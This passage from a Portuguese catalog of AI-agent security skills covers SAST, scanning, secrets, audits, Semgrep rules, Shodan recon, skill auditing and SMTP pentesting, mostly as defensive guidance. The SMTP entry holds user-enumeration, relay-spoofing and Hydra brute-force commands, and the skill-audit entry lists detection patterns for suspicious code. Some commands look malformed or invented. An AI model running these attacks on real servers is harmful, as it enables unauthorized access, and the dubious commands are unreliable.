binwalk -e binary
```

**Referências:**
- [Ghidra](https://ghidra-sre.org/)
- [Radare2](https://r2.re/)
- [Reverse Engineering for Beginners](https://beginners.re/)

---

### 49. sast-configuration
**Descrição:** Configuração de ferramentas SAST (Static Application Security Testing), criação de regras personalizadas para varredura de segurança.

**Quando usar:**
- Implementação de SAST em pipelines
- Criação de regras personalizadas
- Auditoria de código estático

**Exemplos práticos:**
```yaml
# Exemplo 1: Configuração Semgrep
# .semgrep.yml
rules:
  - id: custom-sql-injection
    pattern: |
      $QUERY = "SELECT * FROM users WHERE id = " + $INPUT
    message: "SQL Injection vulnerability detected"
    languages: [python]
    severity: ERROR

# Exemplo 2: GitHub Actions
name: SAST
on: [push, pull_request]
jobs:
  semgrep:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Run Semgrep
        uses: returntocorp/semgrep-action@v1
        with:
          config: p/r2c-security-audit

# Exemplo 3: Configuração SonarQube
sonar.sources=src
sonar.exclusions=**/test/**
sonar.security.scan=true
```

**Casos de uso avançados:**
- **Custom Rules:** Regras específicas para o projeto
- **Multi-language:** Análise em múltiplas linguagens
- **Integration:** Integração com ferramentas existentes

**Integração com outras skills:**
- `semgrep-rule-creator`: Para criar regras
- `security-scanning-security-sast`: Para SAST
- `differential-review`: Para review de código

**Padrões e anti-padrões:**
✅ Fazer: Configurar regras adequadas, integrar em CI/CD, revisar achados
❌ Evitar: Ignorar falsos positivos, não atualizar regras, pular configuração

**Dicas de performance:**
- Use configurações otimizadas para a linguagem
- Implemente caching
- Foque em vulnerabilities críticas

**Comandos úteis:**
```bash
# Semgrep
semgrep --config=auto .

# SonarQube
sonar-scanner -Dsonar.projectKey=myproject

# CodeQL
codeql database analyze . javascript
```

**Referências:**
- [Semgrep Documentation](https://semgrep.dev/docs/)
- [SonarQube](https://docs.sonarqube.org/)
- [CodeQL](https://codeql.github.com/)

---

### 50. scanning-tools
**Descrição:** Domine ferramentas essenciais de varredura de segurança para descoberta de rede, avaliação de vulnerabilidades, testes de aplicações web e validação de conformidade.

**Quando usar:**
- Seleção de ferramentas de segurança
- Configuração de varreduras
- Avaliação de vulnerabilidades

**Exemplos práticos:**
```bash
# Exemplo 1: Nmap - Descoberta de rede
nmap -sn 192.168.1.0/24
nmap -sV -sC target.com

# Exemplo 2: Nikto - Web scanner
nikto -h https://example.com

# Exemplo 3: OWASP ZAP
zap-cli quick-scan -s all -r https://example.com

# Exemplo 4: Nessus
nessuscli scan new --targets target.com
```

**Casos de uso avançados:**
- **Multi-tool Pipeline:** Combinar ferramentas
- **Custom Scanning:** Varreduras personalizadas
- **Continuous Scanning:** Varreduras contínuas

**Integração com outras skills:**
- `pentest-commands`: Para comandos
- `security-scanning-security-dependencies`: Para dependências
- `scanning-tools`: Para ferramentas

**Padrões e anti-padrões:**
✅ Fazer: Usar ferramentas adequadas, configurar corretamente, validar resultados
❌ Evitar: Usar múltiplas ferramentas redundantes, ignorar falsos positivos, não atualizar

**Dicas de performance:**
- Use ferramentas específicas para cada tarefa
- Automatize varreduras
- Mantenha ferramentas atualizadas

**Comandos úteis:**
```bash
# Pipeline de varredura
nmap -sV -sC target.com | tee nmap.txt
nikto -h target.com | tee nikto.txt
zap-cli quick-scan target.com | tee zap.txt

# Análise combinada
cat nmap.txt nikto.txt zap.txt | sort -u
```

**Referências:**
- [Nmap](https://nmap.org/)
- [OWASP ZAP](https://www.zaproxy.org/)
- [Nikto](https://cirt.net/Nikto2)

---

### 51. secrets-management
**Descrição:** Práticas seguras de gestão de segredos para pipelines CI/CD usando Vault, AWS Secrets Manager e outras ferramentas.

**Quando usar:**
- Gestão de credenciais em CI/CD
- Implementação de vault de segredos
- Rotação automática de credenciais

**Exemplos práticos:**
```yaml
# Exemplo 1: GitHub Actions com Secrets
name: Deploy
on: push
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Deploy
        run: |
          echo "Deploying..."
          curl -H "Authorization: Bearer ${{ secrets.API_KEY }}" https://api.example.com/deploy

# Exemplo 2: HashiCorp Vault
vault kv put secret/my-app/api-key value=abc123

# Exemplo 3: AWS Secrets Manager
aws secretsmanager get-secret-value --secret-id my-secret

# Exemplo 4: K8s Secrets
kubectl create secret generic my-secret --from-literal=key=value
```

**Casos de uso avançados:**
- **Dynamic Secrets:** Credenciais de curta duração
- **Secret Rotation:** Rotação automática
- **Audit Logging:** Registro de acessos

**Integração com outras skills:**
- `cred-omega`: Para gestão empresarial
- `aws-secrets-rotation`: Para AWS
- `secrets-management`: Para CI/CD

**Padrões e anti-padrões:**
✅ Fazer: Usar vaults, rotacionar regularmente, monitorar acessos
❌ Evitar: Armazenar em repositórios, compartilhar credenciais, ignorar logs

**Dicas de performance:**
- Use caching para segredos frequentes
- Implemente retry logic
- Use namespaces para isolamento

**Comandos úteis:**
```bash
# Vault
vault kv get secret/my-app

# AWS
aws secretsmanager list-secrets

# K8s
kubectl get secrets
kubectl describe secret my-secret
```

**Referências:**
- [HashiCorp Vault](https://www.vaultproject.io/)
- [AWS Secrets Manager](https://aws.amazon.com/secrets-manager/)
- [Kubernetes Secrets](https://kubernetes.io/docs/concepts/configuration/secret/)

---

### 52. security-and-hardening
**Descrição:** Hardening de código contra vulnerabilidades. Use ao lidar com entrada do usuário, autenticação, armazenamento de dados ou integrações externas.

**Quando usar:**
- Desenvolvimento de funcionalidades que aceitam dados não confiáveis
- Implementação de autenticação
- Armazenamento de dados sensíveis

**Exemplos práticos:**
```python
# Exemplo 1: Validação de input
from marshmallow import Schema, fields, validate

class UserSchema(Schema):
    name = fields.Str(required=True, validate=validate.Length(min=1, max=100))
    email = fields.Email(required=True)
    age = fields.Int(validate=validate.Range(min=0, max=150))

# Exemplo 2: Criptografia de dados
from cryptography.fernet import Fernet

key = Fernet.generate_key()
cipher = Fernet(key)

# Criptografar
encrypted = cipher.encrypt(b"sensitive data")

# Descriptografar
decrypted = cipher.decrypt(encrypted)

# Exemplo 3: Validação de SQL
# ❌ INCORRETO
query = f"SELECT * FROM users WHERE id = {user_id}"

# ✅ CORRETO
query = "SELECT * FROM users WHERE id = %s"
cursor.execute(query, (user_id,))
```

**Casos de uso avançados:**
- **Secure Coding Standards:** Implementar padrões
- **Code Review Guidelines:** Diretrizes de revisão
- **Security Training:** Treinamento de equipes

**Integração com outras skills:**
- `security-auditor`: Para auditorias
- `differential-review`: Para review de código
- `security-scanning-security-sast`: Para SAST

**Padrões e anti-padrões:**
✅ Fazer: Validar todo input, usar prepared statements, criptografar dados sensíveis
❌ Evitar: Confiar em validação client-side, usar queries dinâmicas, armazenar em texto plano

**Dicas de performance:**
- Use bibliotecas de sanitização
- Implemente validação server-side
- Use cache para dados frequentes

**Comandos úteis:**
```bash
# Verificar vulnerabilidades
bandit -r src/
semgrep --config=auto src/

# Auditar dependências
pip-audit
npm audit
```

**Referências:**
- [OWASP Secure Coding Practices](https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/)
- [SANS Secure Coding](https://www.sans.org/secure-coding/)
- [CERT Secure Coding](https://www.securecoding.cert.org/)

---

### 53. security-auditor
**Descrição:** Auditor de segurança especialista em DevSecOps, cibersegurança abrangente e frameworks de conformidade.

**Quando usar:**
- Auditorias abrangentes de segurança
- Conformidade com frameworks
- Revisão de postura de segurança

**Exemplos práticos:**
```bash
# Exemplo 1: Auditoria de infraestrutura
aws securityhub get-findings --filters '{"SeverityLabel":[{"Value":"CRITICAL","Comparison":"EQUALS"}]}'

# Exemplo 2: Auditoria de código
semgrep --config=p/r2c-security-audit .

# Exemplo 3: Auditoria de configurações
kube-bench run

# Exemplo 4: Auditoria de dependências
trivy fs .
```

**Casos de uso avançados:**
- **DevSecOps Audit:** Auditoria de pipelines
- **Compliance Audit:** Conformidade regulatória
- **Security Assessment:** Avaliação de segurança

**Integração com outras skills:**
- `aws-security-audit`: Para AWS
- `production-audit`: Para produção
- `cyber-audit`: Para exposição

**Padrões e anti-padrões:**
✅ Fazer: Usar frameworks reconhecidos, documentar achados, criar planos de remediação
❌ Evitar: Auditar sem escopo, ignorar vulnerabilidades, não validar correções

**Dicas de performance:**
- Use automação para verificações repetitivas
- Priorize vulnerabilidades por impacto
- Mantenha registros históricos

**Comandos úteis:**
```bash
# AWS Security Hub
aws securityhub get-findings --max-items 100

# Kube-bench
kube-bench run --targets master,node

# ScoutSuite
scout aws --report-dir ./report
```

**Referências:**
- [AWS Security Hub](https://aws.amazon.com/security-hub/)
- [Kube-bench](https://github.com/aquasecurity/kube-bench)
- [ScoutSuite](https://github.com/nccgroup/ScoutSuite)

---

### 54. security-bluebook-builder
**Descrição:** Construir política de segurança mínima mas real para aplicativos sensíveis. Documento único usando linguagem MUST/SHOULD/CAN.

**Quando usar:**
- Criação de políticas de segurança
- Definição de gates de segurança
- Documentação de requisitos

**Exemplos práticos:**
```markdown
# Exemplo 1: Política de Segurança
# Security Blue Book

## Autenticação
- MUST: Usar MFA para todos os usuários
- MUST: Tokens com expiração máxima de 15 minutos
- SHOULD: Implementar rate limiting em endpoints de login
- CAN: Usar SSO para ambientes corporativos

## Armazenamento de Dados
- MUST: Criptografar dados sensíveis em repouso
- MUST: Usar TLS 1.3 para dados em trânsito
- SHOULD: Implementar tokenização para dados de pagamento
- CAN: Usar HSM para chaves críticas

## Logging e Monitoramento
- MUST: Registrar todas as tentativas de autenticação
- MUST: Implementar alertas para atividades suspeitas
- SHOULD: Usar SIEM para correlação de eventos
- CAN: Implementar UEBA para detecção avançada
```

**Casos de uso avançados:**
- **Applicativos Financeiros:** Políticas rigorosas
- **Sistemas de Saúde:** Conformidade HIPAA
- **E-commerce:** PCI-DSS compliance

**Integração com outras skills:**
- `security-compliance-compliance-check`: Para conformidade
- `security-auditor`: Para auditorias
- `fsi-compliance-checker`: Para setor financeiro

**Padrões e anti-padrões:**
✅ Fazer: Ser específico, usar linguagem clara, revisar regularmente
❌ Evitar: Ser genérico, usar linguagem ambígua, não atualizar

**Dicas de performance:**
- Use templates existentes
- Revise com stakeholders
- Implemente revisões periódicas

**Comandos úteis:**
```bash
# Criar documento
cat > security-bluebook.md << EOF
# Security Blue Book
## Autenticação
- MUST: Usar MFA
EOF

# Revisar
cat security-bluebook.md | grep "MUST\|SHOULD\|CAN"
```

**Referências:**
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [ISO 27001](https://www.iso.org/iso-27001-information-security.html)
- [OWASP ASVS](https://owasp.org/www-project-application-security-verification-standard/)

---

### 55. security-compliance-compliance-check
**Descrição:** Especialista em conformidade regulatória para sistemas de software incluindo GDPR, HIPAA, SOC2, PCI-DSS.

**Quando usar:**
- Auditorias abrangentes de conformidade
- Orientação de implementação
- Verificação de requisitos

**Exemplos práticos:**
```yaml
# Exemplo 1: Framework de conformidade
compliance:
  standards:
    - name: "GDPR"
      requirements:
        - id: "GDPR-32"
          description: "Security of processing"
          status: "implemented"
          evidence: "encryption-at-rest.txt"
    - name: "HIPAA"
      requirements:
        - id: "HIPAA-164.312"
          description: "Technical safeguards"
          status: "verified"
          evidence: "access-controls.pdf"

# Exemplo 2: Verificação automática
#!/bin/bash
echo "Verificando conformidade GDPR..."
# Verificar criptografia
aws ec2 describe-volumes --query 'Volumes[?Encrypted==`false`]'

# Exemplo 3: Relatório de conformidade
python3 generate_compliance_report.py --standard PCI-DSS --output report.pdf
```

**Casos de uso avançados:**
- **Multi-standard Compliance:** Verificar múltiplos frameworks
- **Continuous Compliance:** Monitoramento contínuo
- **Audit Readiness:** Preparação para auditorias

**Integração com outras skills:**
- `gdpr-data-handling`: Para GDPR
- `pci-compliance`: Para PCI-DSS
- `aws-compliance-checker`: Para AWS

**Padrões e anti-padrões:**
✅ Fazer: Automatizar verificações, manter evidências, atualizar frameworks
❌ Evitar: Confiar em verificações manuais, ignorar mudanças, não documentar

**Dicas de performance:**
- Use ferramentas de automação
- Mantenha documentação atualizada
- Implemente dashboards

**Comandos úteis:**
```bash
# Verificar GDPR
aws configservice get-compliance-by-config-rule --config-rule-name gdpr

# Verificar HIPAA
aws configservice get-compliance-by-config-rule --config-rule-name hipaa

# Gerar relatório
python3 compliance_report.py --format pdf
```

**Referências:**
- [GDPR.eu](https://gdpr.eu/)
- [HIPAA.gov](https://www.hhs.gov/hipaa/)
- [SOC 2](https://www.aicpa.org/interestareas/frc/assuranceadvisoryservices/aicpasoc2report.html)

---

### 56. security-requirement-extraction
**Descrição:** Derivar requisitos de segurança de modelos de ameaças e contexto de negócio.

**Quando usar:**
- Tradução de ameaças em requisitos
- Criação de histórias de segurança
- Construção de casos de teste

**Exemplos práticos:**
```markdown
# Exemplo 1: Requisitos de Segurança
## Modelo de Ameaças STRIDE
- Spoofing: Requisito de autenticação forte
- Tampering: Requisito de integridade de dados
- Repudiation: Requisito de logging e auditoria
- Information Disclosure: Requisito de confidencialidade
- DoS: Requisito de disponibilidade
- Elevation of Privilege: Requisito de autorização

# Exemplo 2: Histórias de Segurança
Como [persona], quero [funcionalidade] para [benefício] com segurança [requisito].

Exemplo:
Como administrador, quero gerenciar usuários para controlar acesso com autenticação MFA.

# Exemplo 3: Casos de Teste
Dado [contexto]
Quando [ação]
Então [resultado esperado]

Exemplo:
Dado um usuário autenticado
Quando tenta acessar recurso de outro usuário
Então acesso deve ser negado
```

**Casos de uso avançados:**
- **Threat-Driven Development:** Desenvolvimento orientado por ameaças
- **Security User Stories:** Histórias de usuário seguras
- **Risk-Based Testing:** Testes baseados em risco

**Integração com outras skills:**
- `stride-analysis-patterns`: Para modelagem de ameaças
- `threat-modeling-expert`: Para modelagem
- `threat-mitigation-mapping`: Para mitigação

**Padrões e anti-padrões:**
✅ Fazer: Ser específico, priorizar por risco, validar com stakeholders
❌ Evitar: Ser genérico, ignorar contexto de negócio, não priorizar

**Dicas de performance:**
- Use templates de requisitos
- Integre com ferramentas de gestão
- Revise regularmente

**Comandos úteis:**
```bash
# Criar requisitos
cat > security-requirements.md << EOF
# Security Requirements
## Authentication
- REQ-AUTH-001: MUST implement MFA
- REQ-AUTH-002: MUST use secure password storage
EOF

# Rastrear requisitos
grep -r "REQ-" docs/
```

**Referências:**
- [OWASP Software Assurance Maturity Model](https://owasp.org/www-project-samm/)
- [NIST SP 800-53](https://csrc.nist.gov/publications/detail/sp/800-53/rev-5/final)
- [ISO 27001 Requirements](https://www.iso.org/iso-27001-information-security.html)

---

### 57. security-scanning-security-dependencies
**Descrição:** Especialista em análise de vulnerabilidades de dependências, geração SBOM e segurança de cadeia de suprimentos.

**Quando usar:**
- Varredura de dependências
- Geração de SBOM
- Análise de licenças

**Exemplos práticos:**
```bash
# Exemplo 1: SBOM com Syft
syft . -o spdx-json > sbom.json

# Exemplo 2: Vulnerability scanning com Grype
grype . --fail-on high

# Exemplo 3: Análise de licenças
license-checker --summary

# Exemplo 4: Verificação de dependências
npm audit --omit=dev
pip-audit
```

**Casos de uso avançados:**
- **Supply Chain Security:** Segurança de cadeia de suprimentos
- **License Compliance:** Conformidade de licenças
- **Automated Remediation:** Remediação automática

**Integração com outras skills:**
- `dependency-management-deps-audit`: Para auditoria
- `supply-chain-security`: Para cadeia de suprimentos
- `scanning-tools`: Para ferramentas

**Padrões e anti-padrões:**
✅ Fazer: Automatizar varreduras, gerar SBOMs, verificar licenças
❌ Evitar: Ignorar vulnerabilidades, usar dependências abandonadas, não verificar transitive

**Dicas de performance:**
- Use cache para varreduras
- Integre com CI/CD
- Configure alertas para vulnerabilidades críticas

**Comandos úteis:**
```bash
# SBOM
syft . -o cyclonedx-json > sbom.json

# Vulnerability scan
grype . --output table

# License check
license-checker --failOn "GPL-3.0;AGPL-3.0"
```

**Referências:**
- [Syft](https://github.com/anchore/syft)
- [Grype](https://github.com/anchore/grype)
- [OWASP Dependency Check](https://owasp.org/www-project-dependency-check/)

---

### 58. security-scanning-security-hardening
**Descrição:** Coordenar varredura e hardening de segurança multicamada em aplicação, infraestrutura e controles de conformidade.

**Quando usar:**
- Hardening abrangente de segurança
- Varredura multicamada
- Conformidade com benchmarks

**Exemplos práticos:**
```yaml
# Exemplo 1: Hardening multicamada
# Camada 1: Aplicação
- name: "Application Security"
  checks:
    - "CSP headers"
    - "Input validation"
    - "Output encoding"

# Camada 2: Infraestrutura
- name: "Infrastructure Security"
  checks:
    - "OS hardening"
    - "Network segmentation"
    - "Firewall rules"

# Camada 3: Conformidade
- name: "Compliance"
  checks:
    - "CIS benchmarks"
    - "PCI-DSS controls"
    - "HIPAA requirements"

# Exemplo 2: Script de hardening
#!/bin/bash
echo "Hardening aplicação..."
# Verificar headers de segurança
curl -I https://example.com | grep -i "content-security-policy"

# Verificar configurações
docker-compose config | grep -i "security"
```

**Casos de uso avançados:**
- **Defense in Depth:** Segurança em camadas
- **Zero Trust:** Modelo zero trust
- **Compliance Automation:** Automação de conformidade

**Integração com outras skills:**
- `container-security-hardening`: Para containers
- `aws-compliance-checker`: Para AWS
- `security-auditor`: Para auditorias

**Padrões e anti-padrões:**
✅ Fazer: Implementar em camadas, automação, monitoramento contínuo
❌ Evitar: Confiar em uma camada, ignorar monitoramento, não atualizar

**Dicas de performance:**
- Use ferramentas de automação
- Implemente dashboards
- Revise regularmente

**Comandos úteis:**
```bash
# Hardening de container
docker-bench-security

# Hardening de OS
lynis audit system

# Hardening de Kubernetes
kube-bench run
```

**Referências:**
- [CIS Benchmarks](https://www.cisecurity.org/cis-benchmarks/)
- [Docker Security](https://docs.docker.com/engine/security/)
- [Kubernetes Security](https://kubernetes.io/docs/concepts/security/)

---

### 59. security-scanning-security-sast
**Descrição:** SAST (Static Application Security Testing) para análise de vulnerabilidades de código em múltiplas linguagens e frameworks.

**Quando usar:**
- Varredura estática de código
- Análise pré-commit
- Integração em CI/CD

**Exemplos práticos:**
```bash
# Exemplo 1: Semgrep
semgrep --config=auto .

# Exemplo 2: SonarQube
sonar-scanner -Dsonar.projectKey=myproject

# Exemplo 3: CodeQL
codeql database analyze . javascript

# Exemplo 4: Bandit (Python)
bandit -r src/
```

**Casos de uso avançados:**
- **Multi-language Analysis:** Análise em múltiplas linguagens
- **Custom Rules:** Regras personalizadas
- **CI/CD Integration:** Integração em pipelines

**Integração com outras skills:**
- `sast-configuration`: Para configuração
- `semgrep-rule-creator`: Para criar regras
- `differential-review`: Para review de código

**Padrões e anti-padrões:**
✅ Fazer: Configurar adequadamente, revisar achados, atualizar regras
❌ Evitar: Ignorar falsos positivos, não configurar, pular atualizações

**Dicas de performance:**
- Use cache para varreduras
- Configure regras específicas
- Integre com pre-commit hooks

**Comandos úteis:**
```bash
# Semgrep
semgrep --config=p/r2c-security-audit .

# Bandit
bandit -r src/ -f json -o report.json

# SonarQube
sonar-scanner -Dsonar.sources=src -Dsonar.language=py
```

**Referências:**
- [Semgrep](https://semgrep.dev/)
- [SonarQube](https://www.sonarqube.org/)
- [CodeQL](https://codeql.github.com/)

---

### 60. semgrep-rule-creator
**Descrição:** Criar regras Semgrep personalizadas para detectar vulnerabilidades de segurança, padrões de bugs e padrões de código.

**Quando usar:**
- Criação de regras personalizadas
- Detecção de padrões específicos
- Customização de varreduras

**Exemplos práticos:**
```yaml
# Exemplo 1: Regra para SQL Injection
rules:
  - id: python-sql-injection
    pattern: |
      $QUERY = "SELECT * FROM users WHERE id = " + $INPUT
    message: "Potential SQL injection"
    languages: [python]
    severity: ERROR

# Exemplo 2: Regra para Hardcoded Secret
rules:
  - id: hardcoded-secret
    pattern: |
      password = "..."
    message: "Hardcoded password detected"
    languages: [python]
    severity: WARNING

# Exemplo 3: Regra para Missing CSRF
rules:
  - id: missing-csrf
    pattern: |
      @app.route("...", methods=["POST"])
      def $FUNC(...):
          ...
    message: "Missing CSRF protection"
    languages: [python]
    severity: WARNING
```

**Casos de uso avançados:**
- **Custom Security Rules:** Regras de segurança específicas
- **Bug Detection:** Detecção de bugs
- **Code Quality:** Qualidade de código

**Integração com outras skills:**
- `sast-configuration`: Para configuração
- `security-scanning-security-sast`: Para SAST
- `semgrep-rule-variant-creator`: Para variantes

**Padrões e anti-padrões:**
✅ Fazer: Testar regras, documentar, usar metatadores apropriados
❌ Evitar: Criar regras muito amplas, não testar, não documentar

**Dicas de performance:**
- Use pattern templates
- Teste com múltiplos exemplos
- Use_semgrep.dev para compartilhar

**Comandos úteis:**
```bash
# Testar regra
semgrep --config=custom-rule.yaml .

# Validar regra
semgrep --validate --config=custom-rule.yaml

# Publicar regra
semgrep publish custom-rule.yaml
```

**Referências:**
- [Semgrep Rules](https://semgrep.dev/docs/writing-rules/overview/)
- [Semgrep Playground](https://semgrep.dev/playground)
- [Semgrep Registry](https://semgrep.dev/explore)

---

### 61. semgrep-rule-variant-creator
**Descrição:** Criar variantes linguísticas de regras Semgrep existentes.

**Quando usar:**
- Portar regras para outras linguagens
- Adaptar detecções para contextos específicos
- Criar bibliotecas de regras

**Exemplos práticos:**
```yaml
# Exemplo 1: Regra base (Python)
rules:
  - id: python-sql-injection
    pattern: |
      $QUERY = "..." + $INPUT
    message: "SQL injection"
    languages: [python]
    severity: ERROR

# Exemplo 2: Variante (JavaScript)
rules:
  - id: javascript-sql-injection
    pattern: |
      $QUERY = "..." + $INPUT
    message: "SQL injection"
    languages: [javascript]
    severity: ERROR

# Exemplo 3: Variante (Java)
rules:
  - id: java-sql-injection
    pattern: |
      $QUERY = "..." + $INPUT
    message: "SQL injection"
    languages: [java]
    severity: ERROR
```

**Casos de uso avançados:**
- **Multi-language Support:** Suporte a múltiplas linguagens
- **Framework-specific Rules:** Regras específicas para frameworks
- **Custom Detections:** Detecções personalizadas

**Integração com outras skills:**
- `semgrep-rule-creator`: Para criar regras base
- `sast-configuration`: Para configuração
- `security-scanning-security-sast`: Para SAST

**Padrões e anti-padrões:**
✅ Fazer: Testar variantes, manter consistência, documentar diferenças
❌ Evitar: Copiar sem adaptar, ignorar diferenças linguísticas, não testar

**Dicas de performance:**
- Use templates de regras
- Automatize criação de variantes
- Teste em múltiplas linguagens

**Comandos úteis:**
```bash
# Listar linguagens suportadas
semgrep --target-lang

# Testar variante
semgrep --config=variant.yaml --target=javascript .

# Comparar regras
diff rule-python.yaml rule-javascript.yaml
```

**Referências:**
- [Semgrep Languages](https://semgrep.dev/docs/supported-languages/)
- [Semgrep Patterns](https://semgrep.dev/docs/writing-rules/pattern-syntax/)
- [Semgrep Registry](https://semgrep.dev/explore)

---

### 62. shodan-reconnaissance
**Descrição:** Metodologias sistemáticas para alavancar Shodan como ferramenta de reconhecimento em pentests.

**Quando usar:**
- Reconhecimento em pentests
- Descoberta de serviços expostos
- Análise de superfície de ataque

**Exemplos práticos:**
```bash
# Exemplo 1: Buscar dispositivos
shodan search "org:example.com port:22"

# Exemplo 2: Verificar vulnerabilidades
shodan search "vuln:cve-2021-44228 org:example.com"

# Exemplo 3: Análise de banner
shodan host 192.168.1.1

# Exemplo 4: Monitoramento
shodan alert create --name "Monitoring" --filters '{"ip": "192.168.1.0/24"}'
```

**Casos de uso avançados:**
- **Asset Discovery:** Descoberta de ativos
- **Vulnerability Assessment:** Avaliação de vulnerabilidades
- **Threat Intelligence:** Inteligência de ameaças

**Integração com outras skills:**
- `red-team-tools`: Para ferramentas de reconhecimento
- `scanning-tools`: Para varreduras
- `threat-modeling-expert`: Para modelagem

**Padrões e anti-padrões:**
✅ Fazer: Usar para reconhecimento passivo, correlacionar com outras fontes
❌ Evitar: Confiar apenas em Shodan, ignorar falsos positivos, não validar

**Dicas de performance:**
- Use filtros específicos
- Configure alertas
- Integre com outras ferramentas

**Comandos úteis:**
```bash
# Instalar CLI
pip install shodan

# Inicializar
shodan init API_KEY

# Buscar
shodan search "apache country:US"
```

**Referências:**
- [Shodan Documentation](https://shodan.readthedocs.io/)
- [Shodan API](https://developer.shodan.io/)
- [Shodan for Pentesters](https://blog.shodan.io/for-pentesters/)

---

### 63. skill-audit
**Descrição:** Scanner de segurança pré-instalação para skills de agentes de IA. 7,5% de 14.706 skills são maliciosas.

**Quando usar:**
- Antes de instalar skills de IA
- Auditoria periódica
- Verificação de integridade

**Exemplos práticos:**
```python
# Exemplo 1: Verificar hash
import hashlib

def verify_skill_integrity(skill_path, expected_hash):
    with open(skill_path, 'rb') as f:
        content = f.read()
    actual_hash = hashlib.sha256(content).hexdigest()
    return actual_hash == expected_hash

# Exemplo 2: Analisar padrões
import re

def analyze_skill_patterns(skill_path):
    with open(skill_path, 'r') as f:
        content = f.read()
    
    suspicious_patterns = [
        r'eval\(',
        r'exec\(',
        r'import os',
        r'subprocess',
        r'base64'
    ]
    
    for pattern in suspicious_patterns:
        if re.search(pattern, content):
            print(f"Padrão suspeito: {pattern}")

# Exemplo 3: Verificar permissões
import os

def check_permissions(skill_path):
    stat = os.stat(skill_path)
    if stat.st_mode & 0o002:  # World-writable
        print("Aviso: Arquivo gravável por todos")
```

**Casos de uso avançados:**
- **Automated Scanning:** Varredura automatizada
- **Behavioral Analysis:** Análise comportamental
- **Supply Chain Security:** Segurança de cadeia de suprimentos

**Integração com outras skills:**
- `audit-skills`: Para auditoria de skills
- `skill-security-audit`: Para verificações específicas
- `cyber-audit`: Para auditoria de exposição

**Padrões e anti-padrões:**
✅ Fazer: Verificar sempre antes de instalar, usar sandbox, manter registro
❌ Evitar: Instalar sem verificar, confiar em fontes não confiáveis, ignorar alertas

**Dicas de performance:**
- Automatize verificações
- Use cache para hashes
- Integre com CI/CD

**Comandos úteis:**
```bash
# Verificar hash
sha256sum skill.js

# Verificar permissões
ls -la skill.js

# Analisar padrões
grep -E "eval|exec|import os" skill.js
```

**Referências:**
- [OWASP AI Security](https://owasp.org/www-project-top-10-for-large-language-model-applications/)
- [NIST AI RMF](https://www.nist.gov/artificial-intelligence/risk-management-framework)
- [MITRE ATLAS](https://atlas.mitre.org/)

---

### 64. skill-security-audit
**Descrição:** Auditar Skill de Agente, servidor MCP, conector ou extensão desktop antes da instalação.

**Quando usar:**
- Auditoria pré-instalação
- Verificação de segurança
- Análise de comportamento

**Exemplos práticos:**
```bash
# Exemplo 1: Verificar código fonte
find . -name "*.js" -o -name "*.py" | xargs grep -l "eval\|exec"

# Exemplo 2: Verificar dependências
npm audit --audit-level=high
pip-audit

# Exemplo 3: Verificar conexões de rede
netstat -an | grep ESTABLISHED

# Exemplo 4: Analisar com ferramentas estáticas
semgrep --config=auto .
bandit -r .
```

**Casos de uso avançados:**
- **Code Review:** Revisão de código
- **Behavioral Analysis:** Análise comportamental
- **Runtime Monitoring:** Monitoramento em tempo real

**Integração com outras skills:**
- `audit-skills`: Para auditoria de skills
- `skill-audit`: Para verificações específicas
- `security-auditor`: Para auditorias

**Padrões e anti-padrões:**
✅ Fazer: Auditar antes de instalar, usar sandbox, documentar achados
❌ Evitar: Instalar sem auditar, ignorar permissões, não verificar atualizações

**Dicas de performance:**
- Use ferramentas automatizadas
- Mantenha checklists
- Integre com processos de aprovação

**Comandos úteis:**
```bash
# Análise estática
semgrep --config=auto .

# Análise de dependências
npm audit

# Verificar permissões
find . -perm -o+w -type f
```

**Referências:**
- [OWASP AI Security](https://owasp.org/www-project-top-10-for-large-language-model-applications/)
- [NIST AI RMF](https://www.nist.gov/artificial-intelligence/risk-management-framework)
- [MITRE ATLAS](https://atlas.mitre.org/)

---

### 65. smtp-penetration-testing
**Descrição:** Conduzir assessments de segurança abrangentes de servidores SMTP.

**Quando usar:**
- Testes de penetração em servidores de e-mail
- Verificação de configurações
- Auditoria de segurança

**Exemplos práticos:**
```bash
# Exemplo 1: Enumeração de usuários
smtp-user-enum -M VRFY -U users.txt -t target.com

# Exemplo 2: Teste de open relay
swaks --to test@example.com --from attacker@evil.com --server target.com

# Exemplo 3: Verificar TLS
openssl s_client -connect target.com:25 -starttls smtp

# Exemplo 4: Brute force
hydra -l admin -P passwords.txt smtp://target.com
```

**Casos de uso avançados:**
- **Email Spoofing:** Testar spoofing de e-mail
- **Relay Abuse:** Verificar abuso de relay
- **Header Injection:** Injeção de headers

**Integração com outras skills:**
- `email-security`: Para segurança de e-mail
- `ssh-penetration-testing`: Para testes similares
- `red-team-tactics`: Para táticas avançadas

**Padrões e anti-padrões:**
✅ Fazer: Testar em staging, documentar configurações, validar resultados
❌ Evitar: Testar em produção, ignorar impacto, não reportar vulnerabilidades

**Dicas de performance:**
- Use ferramentas automatizadas
- Teste diferentes configurações
- Mantenha wordlists atualizadas

**Comandos úteis:**
```bash
# Listar comandos SMTP
telnet target.com 25

# Verificar configuração
nmap --script smtp-enum-users -p 25 target.com

# Testar autenticação
swaks --auth-user admin --auth-password pass --server target.com
```

**Referências:**
- [SMTP Security](https://datatracker.ietf.org/doc/html/rfc5321)
- [Swaks](https://github.com/swisskyrepo/swaks)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

---

### 66. solidity-security
**Descrição:** Domine melhores práticas de segurança de smart contracts, prevenção de vulnerabilidades e padrões de desenvolvimento Solidity seguro.

**Quando usar:**
- Desenvolvimento de smart contracts
- Auditoria de contratos
- Prevenção de vulnerabilidades

**Exemplos práticos:**
```solidity
// Exemplo 1: Prevenir reentrancy
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract MyContract is ReentrancyGuard {
    function withdraw() external nonReentrant {
        // Lógica de saque
    }
}

// Exemplo 2: Usar SafeMath (Solidity <0.8)
import "@openzeppelin/contracts/math/SafeMath.sol";

using SafeMath for uint256;

function add(uint256 a, uint256 b) public pure returns (uint256) {
    return a.add(b);
}

// Exemplo 3: Verificar overflow (Solidity >=0.8)
function add(uint256 a, uint256 b) public pure returns (uint256) {
    return a + b; // Overflow automaticamente revertido
}

// Exemplo 4: Controle de acesso
modifier onlyOwner() {
    require(msg.sender == owner, "Not owner");
    _;
}
```

**Casos de uso avançados:**
- **DeFi Security:** Segurança em finanças descentralizadas
